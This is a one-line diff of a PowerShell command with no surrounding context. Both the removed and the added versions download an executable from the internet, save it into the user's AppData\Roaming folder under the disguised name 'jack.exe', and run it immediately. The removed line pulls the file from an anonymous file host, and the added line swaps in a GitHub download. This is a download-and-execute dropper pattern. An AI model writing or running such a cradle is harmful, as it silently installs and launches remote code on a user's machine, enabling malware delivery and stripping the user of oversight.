@@ -1,1 +1,1 @@
-$e=New-Object System.Net.WebClient;$e.DownloadFile("https://cdn-136.anonfiles.com/kf6fFe28y1/4d7b0eee-1659891034/ProcessHacker.exe","$HOME\AppData\Roaming\jack.exe");Start-Process -FilePath "$HOME\AppData\Roaming\jack.exe"
+$e=New-Object System.Net.WebClient;$e.DownloadFile("https://github.com/pbatard/rufus/releases/download/v3.20/rufus-3.20.exe","$HOME\AppData\Roaming\jack.exe");Start-Process -FilePath "$HOME\AppData\Roaming\jack.exe"
